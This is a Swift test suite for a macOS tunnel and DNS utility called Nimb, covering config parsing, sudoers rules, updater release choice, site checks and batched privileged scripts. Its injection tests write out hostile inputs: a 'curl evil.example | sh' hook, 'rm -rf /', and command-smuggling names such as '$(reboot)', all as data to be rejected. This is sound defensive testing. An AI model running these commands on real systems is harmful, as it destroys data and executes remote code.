import Foundation
import Testing
@testable import Nimb

@Suite struct UpdaterTests {
    @Test(arguments: [
        ("0.9.5", "0.9.4", true), ("0.10.0", "0.9.9", true), ("1.0.0", "0.9.9", true), ("v0.9.5", "0.9.4", true),
        ("0.9.4", "0.9.4", false), ("0.9.3", "0.9.4", false), ("0.9", "0.9.0", false), ("0.9.1", "0.9", true), ("0.8.9", "0.9.0", false),
    ])
    func comparesVersions(candidate: String, current: String, newer: Bool) {
        #expect(Updater.isNewer(candidate, than: current) == newer)
    }

    @Test func findsTheHashOfTheArchiveByItsName() {
        let text = """
        **SHA-256**
        ```
        \(String(repeating: "a", count: 64))  Nimb-0.9.4.zip
        \(String(repeating: "B", count: 64))  Nimb-0.9.4.dmg
        ```
        """
        #expect(Updater.sha256(for: "Nimb-0.9.4.zip", in: text) == String(repeating: "a", count: 64))
        #expect(Updater.sha256(for: "Nimb-0.9.4.dmg", in: text) == String(repeating: "b", count: 64))
        #expect(Updater.sha256(for: "Nimb-0.9.5.zip", in: text) == nil)
    }

    @Test func aShortHexIsNotAHash() {
        #expect(Updater.firstSHA256(in: "abc123") == nil)
    }
}

@Suite struct WarpConfigTests {
    private let key = Data(repeating: 7, count: 32).base64EncodedString()
    private func config(extraInterface: String = "", extraPeer: String = "", allowed: String = "0.0.0.0/0, ::/0") -> String {
        """
        [Interface]
        PrivateKey = \(key)
        Address = 172.16.0.2/32, 2606:4700::2/128
        MTU = 1280
        Jc = 120
        S1 = 0
        H1 = 1
        \(extraInterface)

        [Peer]
        PublicKey = \(key)
        AllowedIPs = \(allowed)
        Endpoint = 162.159.192.1:2408
        PersistentKeepalive = 25
        \(extraPeer)
        """
    }

    @Test func readsAGoodConfig() throws {
        let parsed = try WarpConfig.parse(config())
        #expect(parsed.summary.endpoint == "162.159.192.1:2408")
        #expect(parsed.summary.addresses.count == 2)
        #expect(parsed.summary.isFullTunnel)
        #expect(parsed.file.contains("private_key=\(key)"))
        #expect(parsed.file.contains("endpoint=162.159.192.1:2408"))
        #expect(parsed.file.contains("jc=120"))
        #expect(parsed.file.contains("allowed_ip=0.0.0.0/0"))
        #expect(parsed.file.hasSuffix("\n"))
    }

    /// The helper runs as root: no line that can run a command may ever reach it.
    @Test func neverCarriesCommandsOver() throws {
        let parsed = try WarpConfig.parse(config(extraInterface: "PostUp = curl evil.example | sh\nPreDown = rm -rf /\nPostDown = x\nPreUp = y"))
        #expect(!parsed.file.lowercased().contains("postup"))
        #expect(!parsed.file.contains("curl"))
        #expect(!parsed.file.contains("rm -rf"))
        #expect(parsed.summary.ignored.count == 4)
    }

    @Test func aTunnelOfSomeRoutesIsNotFull() throws {
        let parsed = try WarpConfig.parse(config(allowed: "10.0.0.0/8"))
        #expect(!parsed.summary.isFullTunnel)
    }

    @Test func refusesWhatIsWrong() {
        #expect(throws: WarpConfigError.self) { try WarpConfig.parse(config().replacingOccurrences(of: key, with: "not-a-key")) }
        #expect(throws: WarpConfigError.self) { try WarpConfig.parse(config().replacingOccurrences(of: "162.159.192.1:2408", with: "bad endpoint")) }
        #expect(throws: WarpConfigError.self) { try WarpConfig.parse(config().replacingOccurrences(of: "162.159.192.1:2408", with: "1.2.3.4:99999")) }
        #expect(throws: WarpConfigError.self) { try WarpConfig.parse(config(allowed: "everything")) }
        #expect(throws: WarpConfigError.self) { try WarpConfig.parse(config().replacingOccurrences(of: "MTU = 1280", with: "MTU = 99999")) }
        #expect(throws: WarpConfigError.self) { try WarpConfig.parse(config(extraInterface: "Jc = 1; reboot")) }
        #expect(throws: WarpConfigError.self) { try WarpConfig.parse("Address = 1.2.3.4/32") }
        #expect(throws: WarpConfigError.self) { try WarpConfig.parse(config() + "\n[Peer]\nPublicKey = \(key)\n") }
    }

    @Test func refusesAMissingPart() {
        #expect(throws: WarpConfigError.self) { try WarpConfig.parse(config().replacingOccurrences(of: "PrivateKey = \(key)", with: "")) }
        #expect(throws: WarpConfigError.self) { try WarpConfig.parse(config().replacingOccurrences(of: "Address = 172.16.0.2/32, 2606:4700::2/128", with: "")) }
    }
}

@Suite struct DNSRuleTests {
    private let services = ["Wi-Fi", "Thunderbolt Bridge", "USB 10/100/1000 LAN"]

    @Test func theRuleNamesOnlyTheCommandsOfNimb() {
        let rule = DNSManager.sudoersRule(for: "daniil", services: services)
        let line = rule[1]
        #expect(line.hasPrefix("daniil ALL = (root) NOPASSWD: "))
        #expect(!line.contains("*"), "a wildcard would let any program set any DNS")
        let commands = line.replacingOccurrences(of: "daniil ALL = (root) NOPASSWD: ", with: "").components(separatedBy: ", ")
        let allowedAddresses = Set(DNSProvider.all.flatMap(\.addresses) + ["Empty"])
        for command in commands {
            if command.hasPrefix("/usr/sbin/networksetup -setdnsservers ") {
                let addresses = command.split(separator: " ").dropFirst(3).map(String.init)
                // The service name may hold spaces written as "\ ": what is left at the end are the addresses.
                #expect(addresses.contains { allowedAddresses.contains($0) }, "unexpected command: \(command)")
            } else {
                #expect(["/usr/bin/dscacheutil -flushcache", "/usr/bin/killall -HUP mDNSResponder"].contains(command), "unexpected command: \(command)")
            }
        }
        #expect(commands.contains("/usr/bin/dscacheutil -flushcache"))
    }

    @Test func everyServiceGetsEveryProviderAndAutomatic() {
        let line = DNSManager.sudoersRule(for: "daniil", services: ["Wi-Fi"])[1]
        #expect(line.contains("-setdnsservers Wi-Fi Empty"))
        for provider in DNSProvider.all { #expect(line.contains("-setdnsservers Wi-Fi \(provider.addresses.joined(separator: " "))")) }
    }

    @Test func spacesInANameAreEscaped() {
        let line = DNSManager.sudoersRule(for: "daniil", services: ["Thunderbolt Bridge"])[1]
        #expect(line.contains("-setdnsservers Thunderbolt\\ Bridge Empty"))
    }

    @Test(arguments: ["Wi-Fi", "Ethernet", "Thunderbolt Bridge", "USB 10/100/1000 LAN", "Ethernet Adapter (en6)"])
    func ordinaryNamesAreSafe(name: String) {
        #expect(DNSManager.isRuleSafe(name))
    }

    @Test(arguments: ["Wi-Fi, ALL", "x; rm -rf /", "a*b", "name\nnext", "", "$(reboot)", "`id`", "a\\b", "-flag"])
    func strangeNamesAreNotSafe(name: String) {
        #expect(!DNSManager.isRuleSafe(name))
    }

    @Test func theListOfProvidersIsSound() {
        let ids = DNSProvider.all.map(\.id)
        #expect(Set(ids).count == ids.count)
        let addresses = DNSProvider.all.flatMap(\.addresses)
        #expect(Set(addresses).count == addresses.count)
        for address in addresses { #expect(address.range(of: #"^(\d{1,3}\.){3}\d{1,3}$"#, options: .regularExpression) != nil) }
        #expect(DNSProvider.all.first?.id == "geohide-eu", "the first provider is the default one")
    }
}

@Suite struct CheckVerdictTests {
    private func probe(_ code: Int, failure: String? = nil, seconds: Double = 0.4) -> SiteProbe {
        SiteProbe(name: "p", url: "https://example.com/\(code)\(failure ?? "")\(seconds)", code: code, seconds: seconds, failure: failure)
    }

    @Test func aProbeAnswersWithAnythingButAServerError() {
        #expect(probe(200).answered)
        #expect(probe(404).answered, "a 404 of the site itself still means the site is reachable")
        #expect(probe(403).answered)
        #expect(!probe(500).answered)
        #expect(!probe(0).answered)
        #expect(!probe(200, failure: "время ожидания вышло").answered)
    }

    @Test func allAnsweredWorks() {
        let check = SiteCheck(name: "YouTube", probes: [probe(200), probe(204), probe(301)])
        #expect(check.verdict == .works)
        #expect(check.result.hasPrefix("открывается"))
    }

    @Test func someAnsweredIsPartial() {
        let check = SiteCheck(name: "YouTube", probes: [probe(200), probe(0, failure: "x"), probe(204)])
        #expect(check.verdict == .partial)
        #expect(check.result == "частично: 2 из 3")
    }

    @Test func noneAnsweredIsDown() {
        let check = SiteCheck(name: "Discord", probes: [probe(0, failure: "a"), probe(0, failure: "b")])
        #expect(check.verdict == .down)
        #expect(check.result == "не отвечает")
    }

    @Test func theTimeIsTheMedianOfTheAnswers() throws {
        let check = SiteCheck(name: "x", probes: [probe(200, seconds: 0.2), probe(200, seconds: 3.0), probe(200, seconds: 0.4), probe(0, failure: "x", seconds: 9)])
        #expect(try #require(check.seconds) == 0.4)
    }
}

@Suite struct ServiceStatusTests {
    @Test func aFewDeadAddressesInAPoolStillWork() {
        #expect(ServiceResult(name: "ChatGPT", answered: 4, blocked: 0, total: 5).status == .works)
        #expect(ServiceResult(name: "ChatGPT", answered: 3, blocked: 0, total: 4).status == .works)
    }

    @Test func tooManyDeadAddressesAreUnstable() {
        #expect(ServiceResult(name: "ChatGPT", answered: 2, blocked: 0, total: 5).status == .unstable)
    }

    @Test func aRefusalPageMakesItUnstableEvenWithManyAnswers() {
        #expect(ServiceResult(name: "Gemini", answered: 4, blocked: 1, total: 5).status == .unstable)
    }

    @Test func noAnswersIsDownOrBlocked() {
        #expect(ServiceResult(name: "Claude", answered: 0, blocked: 0, total: 5).status == .down)
        #expect(ServiceResult(name: "Claude", answered: 0, blocked: 3, total: 5).status == .blocked)
    }
}

@Suite struct FaderTests {
    @Test func movesSmoothlyInOneSecond() {
        var fader = MascotMotion.Fader()
        let start = Date(timeIntervalSinceReferenceDate: 1000)
        fader.set(1, now: start)
        #expect(fader.value(at: start) == 0)
        #expect(abs(fader.value(at: start.addingTimeInterval(0.5)) - 0.5) < 1e-9)
        #expect(fader.value(at: start.addingTimeInterval(1)) == 1)
        #expect(fader.value(at: start.addingTimeInterval(30)) == 1, "it stays at the end")
        #expect(fader.value(at: start.addingTimeInterval(-5)) == 0, "and before the start")
    }

    @Test func turningBackMidwayStartsFromWhereItIs() {
        var fader = MascotMotion.Fader()
        let start = Date(timeIntervalSinceReferenceDate: 1000)
        fader.set(1, now: start)
        let middle = start.addingTimeInterval(0.5)
        fader.set(0, now: middle)
        #expect(abs(fader.value(at: middle) - 0.5) < 1e-9, "no jump at the moment of the change")
        #expect(fader.value(at: middle.addingTimeInterval(1)) == 0)
    }

    @Test func theSameTargetDoesNotRestartIt() {
        var fader = MascotMotion.Fader()
        let start = Date(timeIntervalSinceReferenceDate: 1000)
        fader.set(1, now: start)
        fader.set(1, now: start.addingTimeInterval(0.9))
        #expect(fader.value(at: start.addingTimeInterval(1)) == 1)
    }
}

/// The warning about another key of Telegram: shown while it goes on, gone after ten quiet seconds, back when it starts again.
@Suite struct RecentCountTests {
    private let t0 = Date(timeIntervalSinceReferenceDate: 5000)

    @Test func isRecentRightAfterGrowth() {
        var watch = RecentCount(quiet: 10)
        let before = watch.observe(0, at: t0)
        let after = watch.observe(3, at: t0.addingTimeInterval(2))
        #expect(!before)
        #expect(after)
    }

    @Test func goesAwayAfterTheQuietTime() {
        var watch = RecentCount(quiet: 10)
        _ = watch.observe(3, at: t0)
        let justBefore = watch.observe(3, at: t0.addingTimeInterval(9.9))
        let atTheLimit = watch.observe(3, at: t0.addingTimeInterval(10))
        let muchLater = watch.observe(3, at: t0.addingTimeInterval(600))
        #expect(justBefore)
        #expect(!atTheLimit)
        #expect(!muchLater, "the old total alone does not bring it back")
    }

    @Test func comesBackWhenItStartsAgain() {
        var watch = RecentCount(quiet: 10)
        _ = watch.observe(3, at: t0)
        let quiet = watch.observe(3, at: t0.addingTimeInterval(30))
        let again = watch.observe(4, at: t0.addingTimeInterval(31))
        #expect(!quiet)
        #expect(again)
    }

    @Test func aCounterThatStartsAgainDoesNotCount() {
        var watch = RecentCount(quiet: 10)
        _ = watch.observe(5, at: t0)
        watch.reset()
        #expect(!watch.isRecent(at: t0.addingTimeInterval(1)))
        let zero = watch.observe(0, at: t0.addingTimeInterval(2))
        let grown = watch.observe(1, at: t0.addingTimeInterval(3))
        #expect(!zero)
        #expect(grown, "growth after the restart is new")
    }

    @Test func aCounterThatFallsIsNotGrowth() {
        var watch = RecentCount(quiet: 10)
        _ = watch.observe(5, at: t0)
        let fallen = watch.observe(2, at: t0.addingTimeInterval(20))
        let grown = watch.observe(3, at: t0.addingTimeInterval(21))
        #expect(!fallen)
        #expect(grown)
    }
}

@Suite struct UpdateScheduleTests {
    private let t0 = Date(timeIntervalSinceReferenceDate: 9000)

    @Test func theIntervalIsTenMinutes() {
        #expect(UpdateSchedule.interval == 600)
    }

    @Test func aFirstCheckIsDueAtOnce() {
        #expect(UpdateSchedule.isDue(lastTry: .distantPast, now: t0))
    }

    @Test func isNotDueBeforeTenMinutes() {
        #expect(!UpdateSchedule.isDue(lastTry: t0, now: t0.addingTimeInterval(30)))
        #expect(!UpdateSchedule.isDue(lastTry: t0, now: t0.addingTimeInterval(9 * 60)))
    }

    @Test func isDueAtTenMinutesNotAMinuteLater() {
        #expect(UpdateSchedule.isDue(lastTry: t0, now: t0.addingTimeInterval(600)))
        #expect(UpdateSchedule.isDue(lastTry: t0, now: t0.addingTimeInterval(597)), "the timer is not exact: a few seconds of slack")
        #expect(!UpdateSchedule.isDue(lastTry: t0, now: t0.addingTimeInterval(590)))
    }
}

/// One notification for one version, however often the check runs.
@Suite struct UpdateNoticeTests {
    @Test func theFirstTimeTellsAboutTheVersion() {
        #expect(UpdateNotice.shouldTell(version: "0.9.6", lastTold: nil))
    }

    @Test func theSameVersionIsNeverToldTwice() {
        #expect(!UpdateNotice.shouldTell(version: "0.9.6", lastTold: "0.9.6"))
        #expect(!UpdateNotice.shouldTell(version: "v0.9.6", lastTold: "0.9.6"))
    }

    @Test func aNewerVersionIsToldAboutEvenIfTheOldOneWasNotInstalled() {
        #expect(UpdateNotice.shouldTell(version: "0.9.7", lastTold: "0.9.6"))
        #expect(UpdateNotice.shouldTell(version: "0.10.0", lastTold: "0.9.9"))
        #expect(UpdateNotice.shouldTell(version: "1.0.0", lastTold: "0.9.9"))
    }

    @Test func anOlderVersionIsNotToldAbout() {
        #expect(!UpdateNotice.shouldTell(version: "0.9.5", lastTold: "0.9.6"), "a stale answer of GitHub must not bring a notification back")
    }

    /// The whole story of a person who does not update: ten checks in a row tell once, the next release tells once again.
    @Test func manyChecksMakeOneNotificationPerVersion() {
        var told: [String] = []
        var last: String?
        for version in ["0.9.6", "0.9.6", "0.9.6", "0.9.5", "0.9.6", "0.9.7", "0.9.7", "0.9.6", "0.9.7"] {
            if UpdateNotice.shouldTell(version: version, lastTold: last) { told.append(version); last = version }
        }
        #expect(told == ["0.9.6", "0.9.7"])
    }
}

@Suite struct BrowserDNSTests {
    private func prefs(_ mode: Int) -> String { "user_pref(\"network.trr.mode\", \(mode));\nuser_pref(\"other\", 1);" }

    @Test(arguments: [(5, true), (0, true), (2, false), (3, false)])
    func readsWhetherDNSOverHTTPSIsOff(mode: Int, off: Bool) {
        #expect(BrowserDNS.switchedOff(prefs(mode)) == off)
    }

    @Test func noLineMeansTheBrowserMayStillUseIt() {
        #expect(!BrowserDNS.switchedOff("user_pref(\"browser.startup.page\", 3);"))
        #expect(!BrowserDNS.switchedOff(""))
    }

    @Test func theLastLineAboutItWins() {
        #expect(BrowserDNS.switchedOff(prefs(2) + "\n" + prefs(5)))
        #expect(!BrowserDNS.switchedOff(prefs(5) + "\n" + prefs(3)))
    }

    @Test func saysNothingWithoutFirefoxOrWithoutProfiles() {
        #expect(BrowserDNS.firefoxWarning(installed: false, profiles: [prefs(2)]) == nil)
        #expect(BrowserDNS.firefoxWarning(installed: true, profiles: []) == nil)
    }

    @Test func saysItWhenAProfileMayAskCloudflare() {
        #expect(BrowserDNS.firefoxWarning(installed: true, profiles: [""]) == BrowserDNS.firefoxText)
        #expect(BrowserDNS.firefoxWarning(installed: true, profiles: [prefs(2)]) == BrowserDNS.firefoxText)
        #expect(BrowserDNS.firefoxWarning(installed: true, profiles: [prefs(5), ""]) == BrowserDNS.firefoxText, "one profile left on is enough to say it")
    }

    @Test func saysNothingWhenEveryProfileHasItOff() {
        #expect(BrowserDNS.firefoxWarning(installed: true, profiles: [prefs(5), prefs(0)]) == nil)
    }
}

@Suite struct TunnelDropTests {
    private let noon = Date(timeIntervalSince1970: 1_800_000_000)

    @Test func readsTheNoteOfTheHelper() throws {
        let note = try #require(TunnelDrop.parse("1800000000 no-handshake\n"))
        #expect(note.when == noon)
        #expect(note.reason == "no-handshake")
    }

    @Test func aNoteWithoutAReasonIsStillANote() throws {
        #expect(try #require(TunnelDrop.parse("1800000000")).reason == "")
    }

    @Test(arguments: ["", "no-handshake", "0 no-handshake", "-5 x", "abc def"])
    func refusesWhatIsNotANote(text: String) {
        #expect(TunnelDrop.parse(text) == nil)
    }

    @Test func aNoteIsToldOnce() {
        let now = noon.addingTimeInterval(60)
        #expect(TunnelDrop.isNews(noon, seen: 0, now: now))
        #expect(!TunnelDrop.isNews(noon, seen: noon.timeIntervalSince1970, now: now))
        #expect(TunnelDrop.isNews(noon.addingTimeInterval(3600), seen: noon.timeIntervalSince1970, now: now.addingTimeInterval(7200)), "a later drop is news again")
    }

    @Test func anOldNoteIsHistory() {
        #expect(!TunnelDrop.isNews(noon, seen: 0, now: noon.addingTimeInterval(TunnelDrop.newsFor + 1)))
    }
}

/// Which release of the list the updater takes: the newest one for the Mac, whatever else the repository holds.
@Suite struct UpdaterChoiceTests {
    private func release(_ tag: String, draft: Bool = false, prerelease: Bool = false, assets: [String]? = nil, body: String = "") -> Updater.GitHubRelease {
        let version = tag.drop(while: { !$0.isNumber })
        let names = assets ?? ["Nimb-\(version).dmg", "Nimb-\(version).zip"]
        let json = """
        {"tag_name": "\(tag)", "draft": \(draft), "prerelease": \(prerelease), "body": "\(body)", "html_url": "https://example.test/\(tag)",
         "assets": [\(names.map { "{\"name\": \"\($0)\", \"browser_download_url\": \"https://example.test/\(tag)/\($0)\"}" }.joined(separator: ","))]}
        """
        return try! JSONDecoder().decode(Updater.GitHubRelease.self, from: Data(json.utf8))
    }

    @Test(arguments: [("v0.9.9", true), ("0.9.9", true), ("V1.0", true), ("windows-v0.1.0", false), ("v1.0.0-beta", false), ("latest", false), ("", false)])
    func tellsTheTagsOfTheMac(tag: String, isMac: Bool) {
        #expect(Updater.isMacTag(tag) == isMac)
    }

    @Test func aWindowsReleaseNeverWins() {
        let windows = release("windows-v0.1.0", assets: ["Nimb-Setup-0.1.0-amd64.exe", "Nimb-9.9.9.zip"])
        let newest = Updater.newestForMac(in: [windows, release("v0.9.9")])
        #expect(newest?.version == "0.9.9")
        #expect(newest?.assetName == "Nimb-0.9.9.zip")
    }

    @Test func prereleasesAndDraftsAreLeftOut() {
        let list = [release("v1.0.0", prerelease: true), release("v0.9.10", draft: true), release("v0.9.9")]
        #expect(Updater.newestForMac(in: list)?.version == "0.9.9")
    }

    @Test func aReleaseWithoutTheArchiveIsLeftOut() {
        let list = [release("v0.9.10", assets: ["Nimb-0.9.10.dmg"]), release("v0.9.9")]
        #expect(Updater.newestForMac(in: list)?.version == "0.9.9")
    }

    @Test func theHighestVersionWinsNotTheFirstInTheList() {
        let list = [release("v0.9.9"), release("v0.10.0"), release("v0.9.10")]
        #expect(Updater.newestForMac(in: list)?.version == "0.10.0")
    }

    @Test func nothingForTheMacIsNil() {
        #expect(Updater.newestForMac(in: [release("windows-v0.1.0")]) == nil)
        #expect(Updater.newestForMac(in: []) == nil)
    }

    @Test func theHashComesFromTheNotesOfTheChosenRelease() {
        let hash = String(repeating: "c", count: 64)
        let list = [release("windows-v0.1.0", body: String(repeating: "d", count: 64) + "  Nimb-Setup.exe"),
                    release("v0.9.9", body: hash + "  Nimb-0.9.9.zip")]
        #expect(Updater.newestForMac(in: list)?.sha256 == hash)
    }

    @Test func theFeedGivesTheNewestTagOfTheMac() {
        let feed = """
        <entry><link rel="alternate" type="text/html" href="https://github.com/Dizrane/Nimb/releases/tag/windows-v0.2.0"/></entry>
        <entry><link rel="alternate" type="text/html" href="https://github.com/Dizrane/Nimb/releases/tag/v0.9.9"/></entry>
        <entry><link rel="alternate" type="text/html" href="https://github.com/Dizrane/Nimb/releases/tag/v0.10.0"/></entry>
        <entry><link rel="alternate" type="text/html" href="https://github.com/Dizrane/Nimb/releases/tag/v0.9.0"/></entry>
        """
        #expect(Updater.newestMacTag(inFeed: feed) == "v0.10.0")
        #expect(Updater.newestMacTag(inFeed: "<entry>nothing</entry>") == nil)
        #expect(Updater.newestMacTag(inFeed: "href=\"https://github.com/Dizrane/Nimb/releases/tag/windows-v0.2.0\"") == nil)
    }
}

/// What root installs must be what the app staged: a file that changes on the way stops everything.
@Suite struct StagedFilesTests {
    private func shell(_ script: String) throws -> String {
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/bin/sh")
        process.arguments = ["-c", script]
        let out = Pipe(), err = Pipe()
        process.standardOutput = out
        process.standardError = err
        try process.run()
        let output = out.fileHandleForReading.readDataToEndOfFile()
        let errors = err.fileHandleForReading.readDataToEndOfFile()
        process.waitUntilExit()
        guard process.terminationStatus == 0 else { throw DNSError.failed(String(decoding: errors, as: UTF8.self)) }
        return String(decoding: output, as: UTF8.self)
    }

    private func folder(_ name: String) throws -> URL {
        let url = FileManager.default.temporaryDirectory.appendingPathComponent("nimb-test-\(name)-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: url, withIntermediateDirectories: true)
        return url
    }

    /// The script of root as a test runs it: the checks, then a copy to `destination`. Returns what is left in the folder of root.
    private func run(_ staged: StagedFiles, root: URL, destination: URL) throws -> [String] {
        let script = (["set -e"] + staged.guardedCopy(into: root.path) + ["/bin/cp \"$stage/tool\" '\(destination.path)/tool'"]).joined(separator: "; ")
        _ = try shell(script)
        return try FileManager.default.contentsOfDirectory(atPath: root.path)
    }

    @Test func installsWhatWasStagedAndLeavesNothingBehind() throws {
        let root = try folder("root"), destination = try folder("dest")
        let staged = try StagedFiles([("tool", Data("the real tool".utf8)), ("other", Data("x".utf8))])
        defer { staged.remove(); try? FileManager.default.removeItem(at: root); try? FileManager.default.removeItem(at: destination) }
        let left = try run(staged, root: root, destination: destination)
        #expect(try String(contentsOf: destination.appendingPathComponent("tool"), encoding: .utf8) == "the real tool")
        #expect(left.isEmpty, "the folder of root is removed when the script ends")
    }

    @Test func stopsWhenAFileChangedWhileThePasswordWasTyped() throws {
        let root = try folder("root"), destination = try folder("dest")
        let staged = try StagedFiles([("tool", Data("the real tool".utf8))])
        defer { staged.remove(); try? FileManager.default.removeItem(at: root); try? FileManager.default.removeItem(at: destination) }
        try Data("something else".utf8).write(to: staged.folder.appendingPathComponent("tool"))
        #expect(throws: DNSError.self) { _ = try run(staged, root: root, destination: destination) }
        #expect(!FileManager.default.fileExists(atPath: destination.appendingPathComponent("tool").path))
        #expect(try FileManager.default.contentsOfDirectory(atPath: root.path).isEmpty)
    }

    @Test func stopsWhenAFileIsReplacedByALink() throws {
        let root = try folder("root"), destination = try folder("dest"), elsewhere = try folder("else")
        let staged = try StagedFiles([("tool", Data("the real tool".utf8))])
        defer { staged.remove(); for url in [root, destination, elsewhere] { try? FileManager.default.removeItem(at: url) } }
        try Data("a link to another file".utf8).write(to: elsewhere.appendingPathComponent("other"))
        let path = staged.folder.appendingPathComponent("tool")
        try FileManager.default.removeItem(at: path)
        try FileManager.default.createSymbolicLink(at: path, withDestinationURL: elsewhere.appendingPathComponent("other"))
        #expect(throws: DNSError.self) { _ = try run(staged, root: root, destination: destination) }
        #expect(!FileManager.default.fileExists(atPath: destination.appendingPathComponent("tool").path))
    }

    @Test func theMessageSaysWhatHappened() throws {
        let root = try folder("root"), destination = try folder("dest")
        let staged = try StagedFiles([("tool", Data("the real tool".utf8))])
        defer { staged.remove(); try? FileManager.default.removeItem(at: root); try? FileManager.default.removeItem(at: destination) }
        try Data("changed".utf8).write(to: staged.folder.appendingPathComponent("tool"))
        do { _ = try run(staged, root: root, destination: destination); Issue.record("must fail") } catch {
            #expect(error.localizedDescription.contains("изменились по дороге"))
        }
    }
}

/// Jobs that ask for the password at the same moment go under one prompt, each with its own result.
@Suite struct PrivilegedBatchTests {
    /// Stands for root: runs the script in a shell of this user, and fails the way `runPrivileged` does.
    private final class FakeRoot: @unchecked Sendable {
        private let lock = NSLock()
        private(set) var scripts: [String] = []
        var refuse = false
        var calls: Int { lock.lock(); defer { lock.unlock() }; return scripts.count }

        func run(_ script: String) throws -> String {
            lock.lock(); scripts.append(script); let refused = refuse; lock.unlock()
            if refused { throw DNSError.cancelled }
            let process = Process()
            process.executableURL = URL(fileURLWithPath: "/bin/sh")
            process.arguments = ["-c", script]
            let out = Pipe(), err = Pipe()
            process.standardOutput = out
            process.standardError = err
            try process.run()
            let output = out.fileHandleForReading.readDataToEndOfFile()
            let errors = err.fileHandleForReading.readDataToEndOfFile()
            process.waitUntilExit()
            guard process.terminationStatus == 0 else {
                let message = String(decoding: errors, as: UTF8.self).trimmingCharacters(in: .whitespacesAndNewlines)
                throw DNSError.failed(message.isEmpty ? "Команда завершилась с кодом \(process.terminationStatus)." : message)
            }
            return String(decoding: output, as: UTF8.self).trimmingCharacters(in: .whitespacesAndNewlines)
        }
    }

    private func batch(_ root: FakeRoot) -> PrivilegedBatch {
        PrivilegedBatch(workFolder: String(NSTemporaryDirectory().dropLast())) { try root.run($0) }
    }

    /// Calls `run` for each script at the same time, each on a thread of its own, and waits for all of them.
    private func together(_ batch: PrivilegedBatch, _ scripts: [String]) -> [Result<String, Error>] {
        let lock = NSLock()
        var results = [Result<String, Error>?](repeating: nil, count: scripts.count)
        let group = DispatchGroup()
        for (index, script) in scripts.enumerated() {
            group.enter()
            DispatchQueue.global().async {
                let result = Result { try batch.run(script) }
                lock.lock(); results[index] = result; lock.unlock()
                group.leave()
            }
        }
        group.wait()
        return results.map { $0! }
    }

    @Test func aCallWithNothingExpectedGoesAloneAndAtOnce() throws {
        let root = FakeRoot()
        #expect(try batch(root).run("echo hi") == "hi")
        #expect(root.calls == 1)
        #expect(root.scripts == ["echo hi"], "not wrapped: it is the script as it is")
    }

    @Test func twoCallsAreOnePromptAndEachHasItsOwnAnswer() throws {
        let root = FakeRoot()
        let jobs = batch(root)
        jobs.expect(2)
        let results = together(jobs, ["echo one", "echo two >&2; exit 3"])
        #expect(root.calls == 1)
        #expect(try results[0].get() == "one")
        #expect { try results[1].get() } throws: { "\($0)".contains("two") || $0.localizedDescription.contains("two") }
    }

    @Test func aFailureOfOneDoesNotHideTheSuccessOfTheOther() throws {
        let root = FakeRoot()
        let jobs = batch(root)
        jobs.expect(2)
        let results = together(jobs, ["exit 7", "echo fine"])
        #expect(root.calls == 1)
        if case .success = results[0] { Issue.record("the first must fail") }
        #expect(try results[1].get() == "fine")
        if case .failure(let error) = results[0] { #expect(error.localizedDescription.contains("7")) }
    }

    @Test func eachScriptRunsInAShellOfItsOwn() throws {
        let root = FakeRoot()
        let jobs = batch(root)
        jobs.expect(2)
        let results = together(jobs, ["x=leaked; echo \"it's\"", "echo \"${x:-clean}\""])
        let texts = try results.map { try $0.get() }
        #expect(Set(texts) == ["it's", "clean"])
    }

    @Test func aRefusedPasswordStopsBoth() {
        let root = FakeRoot()
        root.refuse = true
        let jobs = batch(root)
        jobs.expect(2)
        let results = together(jobs, ["echo a", "echo b"])
        #expect(root.calls == 1, "one prompt, refused once")
        for result in results {
            if case .failure(let error) = result, case DNSError.cancelled = error {} else { Issue.record("must be cancelled") }
        }
    }

    @Test func aMissingSecondCallDoesNotHoldTheFirstForLong() throws {
        let root = FakeRoot()
        let jobs = batch(root)
        jobs.expect(2, within: 0.3)
        let started = Date()
        #expect(try jobs.run("echo alone") == "alone")
        #expect(Date().timeIntervalSince(started) < 5)
        #expect(root.scripts == ["echo alone"])
    }

    @Test func whatWasExpectedIsForgottenAfterTheBatch() throws {
        let root = FakeRoot()
        let jobs = batch(root)
        jobs.expect(2)
        _ = together(jobs, ["echo a", "echo b"])
        let started = Date()
        #expect(try jobs.run("echo c") == "c")
        #expect(Date().timeIntervalSince(started) < 2, "a later call is not kept waiting for a partner")
        #expect(root.calls == 2)
    }

    @Test func theLinesOfAnAnswerAreReadBackWhateverElseIsPrinted() {
        let results = PrivilegedBatch.results(in: "noise\nNIMB-RESULT 1 0 x x\nNIMB-RESULT 0 5 x x\nNIMB-RESULT 9 0 x x\nbroken NIMB-RESULT", count: 3)
        #expect((try? results[1].get()) == "")
        if case .failure(let error) = results[0] { #expect(error.localizedDescription == "Команда завершилась с кодом 5.") } else { Issue.record("0 must fail") }
        if case .failure = results[2] {} else { Issue.record("a job without a line must fail") }
    }
}
